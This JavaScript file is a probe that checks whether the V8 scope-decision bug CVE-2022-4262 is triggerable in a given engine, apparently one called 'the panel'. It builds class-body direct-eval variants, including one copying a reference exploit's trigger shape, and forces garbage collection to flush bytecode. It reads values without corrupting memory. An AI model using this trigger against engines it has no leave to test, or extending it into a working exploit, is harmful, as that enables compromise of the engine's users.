// Detect the CVE-2022-4262 scope-decision mismatch, using the correct shape.
//
// The first version of this probe used a plain function and found no variation
// on either Node or the panel. That probe was invalid: bjrjk's analysis is
// specific that the mismatch needs a **class body**, because a class body is
// always strict while a direct `eval` inside it is still parsed in the enclosing
// scope's mode. The disagreement lives in that boundary, not in a plain function.
//
// This version puts the eval inside a class body (via a computed member name,
// which is evaluated in the class scope) and observes whether the strictness
// decision is stable across a bytecode flush.
//
// It remains safe: it reads `typeof`, never corrupts. A negative result is
// inconclusive; a positive one means the root cause is live here.

const out = {variants: [], notes: []};

function forceMajorGC(rounds) {
  let failed = 0;
  for (let i = 0; i < rounds; i++) {
    try { new ArrayBuffer(0x7fe00000); } catch (e) { failed++; }
  }
  return failed;
}

// Variant 1: direct eval inside a class body's computed key expression. The key
// expression is evaluated in a scope whose strictness is the question.
function buildClassEval() {
  return (0, eval)(`
    (function outer() {
      var result = null;
      var probe = (class C {
        [(function () {
           eval("var v = 'leaked'");
           result = (function () {
             try { return typeof v + ':' + String(v); }
             catch (e) { return 'throw:' + e.name; }
           })();
           return 1;
         })()]
      });
      return result;
    })
  `);
}

// Variant 2: eval in a class *method* body, then read the variable in a nested
// function. Same question, different scope construction.
function buildClassMethod() {
  return (0, eval)(`
    (function outer() {
      var captured = null;
      class D {
        m() {
          eval("var w = 'method'");
          captured = (function () {
            try { return typeof w + ':' + String(w); }
            catch (e) { return 'throw:' + e.name; }
          })();
        }
      }
      new D().m();
      return captured;
    })
  `);
}

// Variant 3: the reference exploit's own arrangement -- a computed class key
// whose expression calls a helper that reads a variable declared by an eval
// elsewhere in the same expression.
function buildReferenceShape() {
  return (0, eval)(`
    (function outer() {
      function dummy() { return true; }
      var target = {};
      var slot1 = {};
      var seen = null;
      ((a = class Clazz {
        [(dummy(
          eval(),
          eval,
          eval,
          target.p1 = 123,
          [],
          slot1.p1 = 1,
          (function () {
             eval("var z = 'ref'");
             seen = (function () {
               try { return typeof z + ':' + String(z); }
               catch (e) { return 'throw:' + e.name; }
             })();
             return 1;
          })()
        )
        ? 0 : (slot1.ballast = 1))]
      }) => {})();
      return seen;
    })
  `);
}

const builders = [
  ['class-key-eval', buildClassEval],
  ['class-method-eval', buildClassMethod],
  ['reference-shape', buildReferenceShape],
];

// Control: the same eval in a plainly sloppy function. This MUST leak; if it does
// not, the probe is measuring the wrong thing entirely.
function sloppyControl() {
  let captured = null;
  (function () {
    eval("var ctl = 'sloppy'");
    captured = (function () {
      try { return typeof ctl + ':' + String(ctl); }
      catch (e) { return 'throw:' + e.name; }
    })();
  })();
  return captured;
}
out.sloppyControl = sloppyControl();
out.sloppyControlExpected = 'string:sloppy';

for (const [name, build] of builders) {
  const rec = {name, strictish: true};
  // Fresh function objects: a cached one would never be re-parsed.
  const run = () => { try { return build()(); } catch (e) { return 'ERR:' + String(e.message).slice(0, 50); } };
  rec.baseline = run();
  rec.afterFlush = null;

  // The flush must happen between two *separate* compilations of the same source.
  const held = (() => { try { return build(); } catch (e) { return null; } })();
  if (held) {
    rec.heldFirst = (() => { try { return held(); } catch (e) { return 'ERR'; } })();
    const failed = forceMajorGC(6);
    rec.failedAllocs = failed;
    rec.heldSecond = (() => { try { return held(); } catch (e) { return 'ERR'; } })();
    rec.changed = rec.heldFirst !== rec.heldSecond;
  }
  rec.afterFlush = run();
  out.variants.push(rec);
}

// Also record whether the reference shape even completes, which tells us the
// slot bookkeeping is accepted by this engine.
out.anyChange = out.variants.some(v => v.changed);
out.verdict = out.anyChange
  ? 'scope-decision-varies'
  : 'no-variation-observed';

out.caveat = 'no variation is inconclusive: the flush may not have discarded this '
  + "bytecode, or the parser may reach the same decision by another path. "
  + "Only a positive result is evidence.";

return JSON.stringify(out, null, 1);
